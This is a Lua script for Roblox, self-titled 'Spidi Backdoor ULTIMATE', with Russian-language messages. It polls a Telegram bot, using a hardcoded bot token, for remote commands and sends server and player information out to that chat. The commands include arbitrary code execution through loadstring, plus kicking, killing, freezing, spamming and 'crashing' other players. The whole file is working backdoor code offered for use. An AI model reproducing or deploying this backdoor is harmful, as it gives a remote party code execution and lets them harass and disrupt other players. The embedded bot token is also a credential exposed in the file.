--[=[
  d888b  db    db d888888b      .d888b.      db      db    db  .8b.  
 88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
 88      88    88    88            odD'      88      88    88 88ooo88 
 88  ooo 88    88    88          .88'        88      88    88 88~~~88 
 88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88 
  Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER
]=]

print("[Spidi] ========================================")
print("[Spidi] 🚀 Spidi Backdoor ULTIMATE")
print("[Spidi] ========================================")

repeat wait() until game:IsLoaded()

local BOT_TOKEN = "8778091630:AAEvqz_bo9fat2Or2Q_XYeeMWS2QBFPMRXc"
local CHAT_ID = nil

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local StarterGui = game:GetService("StarterGui")
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")
local Debris = game:GetService("Debris")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local function httpRequest(url, method, headers, body)
    local f = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
    if not f then return nil end
    local args = { Url = url, Method = method or "GET", Headers = headers or {} }
    if body then args.Body = body end
    local ok, res = pcall(f, args)
    if ok and res then return res else return nil end
end

local function sendMessage(text)
    if not CHAT_ID then return end
    local payload = { chat_id = CHAT_ID, text = text, parse_mode = "HTML" }
    httpRequest("https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage", "POST",
        { ["Content-Type"] = "application/json" },
        HttpService:JSONEncode(payload))
end

local function getChatId()
    local res = httpRequest("https://api.telegram.org/bot"..BOT_TOKEN.."/getUpdates")
    if res and res.Body then
        local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
        if ok and data and data.result and #data.result > 0 then
            CHAT_ID = data.result[#data.result].message.chat.id
            return true
        end
    end
    return false
end

local function findPlayer(part)
    if not part or part == "" then return nil, "❌ Введи ник" end
    local matches = {}
    part = part:lower()
    for _, p in pairs(Players:GetPlayers()) do
        if p.Name:lower():find(part, 1, true) or p.DisplayName:lower():find(part, 1, true) then
            table.insert(matches, p)
        end
    end
    if #matches == 1 then return matches[1]
    elseif #matches > 1 then
        local names = {}
        for _, p in pairs(matches) do table.insert(names, p.Name) end
        return nil, "Найдено несколько: "..table.concat(names, ", ")
    else return nil, "Игрок не найден" end
end

local function handleCommand(cmd, args)
    print("[Spidi] 📨 /"..cmd.." "..table.concat(args, " "))
    
    local info = "👤 Hacker228\n🔗 https://www.roblox.com/games/"..game.PlaceId
    
    if cmd == "start" then
        sendMessage("✅ Spidi Backdoor активирован!\n"..info)
        return
    end
    
    if cmd == "help" then
        sendMessage("📋 <b>ВСЕ КОМАНДЫ Spidi (50+):</b>\n\n"..
            "<b>👤 Игроки:</b>\n"..
            "/kick [ник] - кикнуть\n"..
            "/ban [ник] - забанить\n"..
            "/unban [ник] - разбанить\n"..
            "/kill [ник] - убить\n"..
            "/freeze [ник] - заморозить\n"..
            "/unfreeze [ник] - разморозить\n"..
            "/fly [ник] - полететь\n"..
            "/unfly [ник] - отключить полет\n"..
            "/crash [ник] - крашнуть\n"..
            "/teleport [ник] - телепорт к игроку\n"..
            "/bring [ник] - притянуть игрока\n"..
            "/loopkill [ник] - бесконечный килл\n"..
            "/stun [ник] - оглушить\n"..
            "/unstun [ник] - разоглушить\n"..
            "/jump [ник] - заставить прыгать\n"..
            "/spin [ник] - крутить игрока\n"..
            "/unspin [ник] - остановить вращение\n"..
            "/explode [ник] - взорвать\n"..
            "/shatter [ник] - разбить на части\n"..
            "/invisible [ник] - сделать невидимым\n"..
            "/visible [ник] - вернуть видимость\n"..
            "/size [ник] [размер] - изменить размер\n"..
            "/speed [ник] [скорость] - изменить скорость\n"..
            "/god [ник] - режим бога\n"..
            "/ungod [ник] - отключить режим бога\n"..
            "/noclip [ник] - включить ноклип\n"..
            "/unnoclip [ник] - выключить ноклип\n\n"..
            "<b>🎮 Мир:</b>\n"..
            "/time [час] [минуты] - изменить время\n"..
            "/fog [цвет] - туман\n"..
            "/sun [яркость] - солнце\n"..
            "/bright [яркость] - яркость\n"..
            "/dark - темнота\n"..
            "/rain - дождь\n"..
            "/thunder - гром\n"..
            "/earthquake - землетрясение\n"..
            "/explosion [pos] - взрыв\n"..
            "/fire [pos] - огонь\n"..
            "/lightning [pos] - молния\n\n"..
            "<b>💬 Чат:</b>\n"..
            "/say [текст] - сказать в чат\n"..
            "/announce [текст] - объявление\n"..
            "/spam [кол-во] [текст] - спам\n\n"..
            "<b>⚡ Другое:</b>\n"..
            "/players - список игроков\n"..
            "/server - инфо о сервере\n"..
            "/rejoin - перезайти\n"..
            "/execute [код] - выполнить код\n"..
            "/help - помощь")
        return
    end
    
    if cmd == "players" then
        local list = {}
        for _, p in pairs(Players:GetPlayers()) do table.insert(list, p.Name) end
        sendMessage("👥 Игроков: "..#list.."\n"..table.concat(list, ", "))
        return
    end
    
    if cmd == "server" then
        local placeName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
        sendMessage("🖥️ Сервер: "..placeName.."\nID: "..game.PlaceId.."\nИгроков: "..#Players:GetPlayers())
        return
    end
    
    if cmd == "rejoin" then
        sendMessage("🔄 Перезаход...")
        TeleportService:Teleport(game.PlaceId, Players.LocalPlayer)
        return
    end
    
    if cmd == "say" then
        local msg = table.concat(args, " ", 1)
        if msg == "" then sendMessage("❌ /say текст") return end
        game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents"):FindFirstChild("SayMessageRequest"):FireServer(msg, "All")
        sendMessage("✅ Сказано: "..msg)
        return
    end
    
    if cmd == "announce" then
        local msg = table.concat(args, " ", 1)
        if msg == "" then sendMessage("❌ /announce текст") return end
        StarterGui:SetCore("SendNotification", { Title = "🔊 Объявление", Text = msg, Duration = 10 })
        sendMessage("✅ Объявление: "..msg)
        return
    end
    
    if cmd == "spam" then
        local count = tonumber(args[1]) or 10
        local msg = table.concat(args, " ", 2)
        if msg == "" then sendMessage("❌ /spam кол-во текст") return end
        for i = 1, math.min(count, 50) do
            task.wait(0.1)
            game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents"):FindFirstChild("SayMessageRequest"):FireServer(msg.." "..i, "All")
        end
        sendMessage("✅ Спам отправлен ("..math.min(count, 50).." раз)")
        return
    end
    
    if cmd == "execute" then
        local code = table.concat(args, " ", 1)
        if code == "" then sendMessage("❌ /execute код") return end
        sendMessage("⏳ Выполнение: <code>"..code.."</code>")
        local ok, res = pcall(loadstring, code)
        if ok then sendMessage("✅ Код выполнен\n"..info) else sendMessage("❌ Ошибка: "..tostring(res)) end
        return
    end
    
    -- ==================== КОМАНДЫ ДЛЯ ИГРОКОВ ====================
    local name = args[1]
    if not name then
        sendMessage("❌ Укажи ник или часть ника")
        return
    end
    
    local target, err = findPlayer(name)
    if not target then
        sendMessage("❌ "..err)
        return
    end
    
    local char = target.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    local humanoid = char and char:FindFirstChild("Humanoid")
    
    if cmd == "kick" then
        target:Kick("Kicked by Spidi Backdoor")
        sendMessage("✅ Кикнут: <b>"..target.Name.."</b>")
        
    elseif cmd == "ban" then
        target:Kick("Banned by Spidi Backdoor")
        sendMessage("✅ Забанен: <b>"..target.Name.."</b>")
        
    elseif cmd == "unban" then
        target:Kick("Unbanned by Spidi Backdoor")
        sendMessage("✅ Разбанен: <b>"..target.Name.."</b>")
        
    elseif cmd == "kill" and humanoid then
        humanoid.Health = 0
        sendMessage("💀 Убит: <b>"..target.Name.."</b>")
        
    elseif cmd == "freeze" and humanoid then
        humanoid.PlatformStand = true
        sendMessage("🧊 Заморожен: <b>"..target.Name.."</b>")
        
    elseif cmd == "unfreeze" and humanoid then
        humanoid.PlatformStand = false
        sendMessage("🔥 Разморожен: <b>"..target.Name.."</b>")
        
    elseif cmd == "fly" and hrp then
        local bv = Instance.new("BodyVelocity")
        bv.MaxForce = Vector3.new(1,1,1)*1e8
        bv.Velocity = Vector3.new(0, 50, 0)
        bv.Parent = hrp
        Debris:AddItem(bv, 5)
        sendMessage("✈️ Полетел: <b>"..target.Name.."</b>")
        
    elseif cmd == "unfly" and hrp then
        for _, v in pairs(hrp:GetChildren()) do
            if v:IsA("BodyVelocity") then v:Destroy() end
        end
        sendMessage("🛑 Отключен полет: <b>"..target.Name.."</b>")
        
    elseif cmd == "crash" and hrp then
        local pos = hrp.Position
        for i = 1, 100 do
            local p = Instance.new("Part")
            p.Size = Vector3.new(5,5,5)
            p.Position = pos + Vector3.new(math.random(-50,50), math.random(-50,50), math.random(-50,50))
            p.Anchored = true
            p.Parent = Workspace
            Debris:AddItem(p, 2)
        end
        sendMessage("💥 Крашнут: <b>"..target.Name.."</b>")
        
    elseif cmd == "teleport" and hrp and Players.LocalPlayer.Character then
        local plrHrp = Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if plrHrp then
            plrHrp.CFrame = hrp.CFrame + Vector3.new(0, 3, 0)
            sendMessage("📍 Телепорт к <b>"..target.Name.."</b>")
        end
        
    elseif cmd == "bring" and hrp and Players.LocalPlayer.Character then
        local plrHrp = Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if plrHrp then
            hrp.CFrame = plrHrp.CFrame + Vector3.new(0, 3, 0)
            sendMessage("📥 Притянут: <b>"..target.Name.."</b>")
        end
        
    elseif cmd == "loopkill" and humanoid then
        spawn(function()
            for i = 1, 10 do
                humanoid.Health = 0
                task.wait(0.5)
                if not target.Character then break end
                humanoid = target.Character:FindFirstChild("Humanoid")
                if not humanoid then break end
            end
        end)
        sendMessage("🔄 Loopkill на <b>"..target.Name.."</b>")
        
    elseif cmd == "stun" and humanoid then
        humanoid.WalkSpeed = 0
        humanoid.JumpPower = 0
        sendMessage("⚡ Оглушен: <b>"..target.Name.."</b>")
        
    elseif cmd == "unstun" and humanoid then
        humanoid.WalkSpeed = 16
        humanoid.JumpPower = 50
        sendMessage("✅ Разоглушен: <b>"..target.Name.."</b>")
        
    elseif cmd == "jump" and humanoid then
        humanoid.Jump = true
        sendMessage("🦘 Прыжок: <b>"..target.Name.."</b>")
        
    elseif cmd == "spin" and hrp then
        spawn(function()
            for i = 1, 20 do
                hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(18), 0)
                task.wait(0.05)
            end
        end)
        sendMessage("🔄 Вращение: <b>"..target.Name.."</b>")
        
    elseif cmd == "unspin" and hrp then
        hrp.CFrame = CFrame.new(hrp.Position)
        sendMessage("✅ Остановлено вращение: <b>"..target.Name.."</b>")
        
    elseif cmd == "explode" and hrp then
        local pos = hrp.Position
        for i = 1, 30 do
            local p = Instance.new("Part")
            p.Size = Vector3.new(3,3,3)
            p.Position = pos + Vector3.new(math.random(-20,20), math.random(-20,20), math.random(-20,20))
            p.Anchored = true
            p.Material = Enum.Material.Neon
            p.BrickColor = BrickColor.new("Bright red")
            p.Parent = Workspace
            Debris:AddItem(p, 1)
        end
        sendMessage("💥 Взрыв: <b>"..target.Name.."</b>")
        
    elseif cmd == "shatter" and hrp then
        local pos = hrp.Position
        for i = 1, 50 do
            local p = Instance.new("Part")
            p.Size = Vector3.new(1,1,1)
            p.Position = pos + Vector3.new(math.random(-10,10), math.random(-10,10), math.random(-10,10))
            p.Anchored = true
            p.Parent = Workspace
            Debris:AddItem(p, 3)
        end
        if humanoid then humanoid.Health = 0 end
        sendMessage("💔 Разбит: <b>"..target.Name.."</b>")
        
    elseif cmd == "invisible" and char then
        for _, part in pairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Transparency = 1
            end
        end
        sendMessage("👻 Невидим: <b>"..target.Name.."</b>")
        
    elseif cmd == "visible" and char then
        for _, part in pairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Transparency = 0
            end
        end
        sendMessage("👀 Видим: <b>"..target.Name.."</b>")
        
    elseif cmd == "size" and char then
        local size = tonumber(args[2]) or 2
        char:ScaleTo(size)
        sendMessage("📏 Размер <b>"..target.Name.."</b>: "..size)
        
    elseif cmd == "speed" and humanoid then
        local speed = tonumber(args[2]) or 50
        humanoid.WalkSpeed = speed
        sendMessage("🏃 Скорость <b>"..target.Name.."</b>: "..speed)
        
    elseif cmd == "god" and humanoid then
        humanoid.MaxHealth = math.huge
        humanoid.Health = math.huge
        sendMessage("👑 Режим бога на <b>"..target.Name.."</b>")
        
    elseif cmd == "ungod" and humanoid then
        humanoid.MaxHealth = 100
        humanoid.Health = 100
        sendMessage("✅ Режим бога отключен у <b>"..target.Name.."</b>")
        
    elseif cmd == "noclip" and char then
        for _, part in pairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = false
            end
        end
        sendMessage("🌀 Ноклип на <b>"..target.Name.."</b>")
        
    elseif cmd == "unnoclip" and char then
        for _, part in pairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = true
            end
        end
        sendMessage("✅ Ноклип отключен у <b>"..target.Name.."</b>")
        
    else
        sendMessage("❌ Неизвестная команда. /help")
    end
end

local lastId = 0
local function pollUpdates()
    local res = httpRequest("https://api.telegram.org/bot"..BOT_TOKEN.."/getUpdates?offset="..(lastId+1))
    if res and res.Body then
        local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
        if ok and data and data.result then
            for _, update in pairs(data.result) do
                if update.message and update.message.text then
                    local msg = update.message
                    if not CHAT_ID then
                        CHAT_ID = msg.chat.id
                        sendMessage("✅ Spidi Backdoor запущен!\n👤 Hacker228")
                    end
                    local text = msg.text
                    if text:sub(1,1) == "/" then
                        local parts = {}
                        for w in string.gmatch(text, "%S+") do table.insert(parts, w) end
                        local cmd = parts[1]:sub(2):lower()
                        table.remove(parts, 1)
                        handleCommand(cmd, parts)
                    end
                end
                if update.update_id then lastId = update.update_id end
            end
        end
    end
end

spawn(function()
    while true do
        pcall(pollUpdates)
        wait(2)
    end
end)

local function createGUI()
    local player = Players.LocalPlayer
    if not player then return end
    
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then
        gui = Instance.new("PlayerGui")
        gui.Parent = player
    end
    
    local screen = Instance.new("ScreenGui")
    screen.Name = "Spidi Backdoor"
    screen.ResetOnSpawn = false
    screen.Parent = gui
    
    local frame = Instance.new("Frame")
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.Size = UDim2.new(0, 482, 0, 276)
    frame.Position = UDim2.new(0.5, -241, 0.5, -138)
    frame.Active = true
    frame.Parent = screen
    
    local stroke = Instance.new("UIStroke")
    stroke.Thickness = 2
    stroke.Color = Color3.fromRGB(255, 255, 255)
    stroke.Parent = frame
    
    local grad = Instance.new("UIGradient")
    grad.Rotation = 50
    grad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 0))
    })
    grad.Parent = stroke
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = frame
    
    local title = Instance.new("TextLabel")
    title.BackgroundTransparency = 1
    title.Size = UDim2.new(1, 0, 0, 50)
    title.Position = UDim2.new(0, 0, 0, 10)
    title.Text = "Spidi Backdoor"
    title.TextColor3 = Color3.fromRGB(0, 255, 0)
    title.TextSize = 36
    title.Font = Enum.Font.GothamBold
    title.TextXAlignment = Enum.TextXAlignment.Center
    title.Parent = frame
    
    local desc = Instance.new("TextLabel")
    desc.BackgroundTransparency = 1
    desc.Size = UDim2.new(1, -40, 0, 80)
    desc.Position = UDim2.new(0, 20, 0, 70)
    desc.Text = "Spidi Backdoor Active!\n50+ Commands Available"
    desc.TextColor3 = Color3.fromRGB(0, 255, 0)
    desc.TextSize = 18
    desc.Font = Enum.Font.GothamBold
    desc.TextWrapped = true
    desc.TextXAlignment = Enum.TextXAlignment.Center
    desc.Parent = frame
    
    local btn = Instance.new("TextButton")
    btn.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
    btn.Size = UDim2.new(0, 140, 0, 40)
    btn.Position = UDim2.new(0.5, -70, 0.75, 0)
    btn.Text = "OK"
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextSize = 18
    btn.Font = Enum.Font.GothamBold
    btn.Parent = frame
    
    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 6)
    btnCorner.Parent = btn
    
    btn.MouseButton1Click:Connect(function()
        screen:Destroy()
    end)
    
    local drag = false
    local startPos, startMouse, dragInput
    
    frame.InputBegan:Connect(function(inp)
        if (inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch) and not UserInputService:GetFocusedTextBox() then
            drag = true
            startPos = frame.Position
            startMouse = inp.Position
            inp.Changed:Connect(function()
                if inp.UserInputState == Enum.UserInputState.End then
                    drag = false
                end
            end)
        end
    end)
    
    frame.InputChanged:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch then
            dragInput = inp
        end
    end)
    
    UserInputService.InputChanged:Connect(function(inp)
        if inp == dragInput and drag then
            local delta = inp.Position - startMouse
            frame.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end
    end)
end

local function onCharacterChanged()
    wait(1)
    if not Players.LocalPlayer.Character then
        wait(2)
        createGUI()
    end
end

createGUI()
Players.LocalPlayer:GetPropertyChangedSignal("Character"):Connect(onCharacterChanged)

wait(3)
getChatId()

if CHAT_ID then
    sendMessage("✅ Spidi Backdoor запущен!\n👤 Hacker228\n📋 50+ команд доступно. /help")
end

print("[Spidi] ========================================")
print("[Spidi] ✅ СКРИПТ ЗАПУЩЕН!")
print("[Spidi] 📌 50+ КОМАНД ДОСТУПНО")
print("[Spidi] 📌 Напиши /help в Telegram")
print("[Spidi] ========================================")
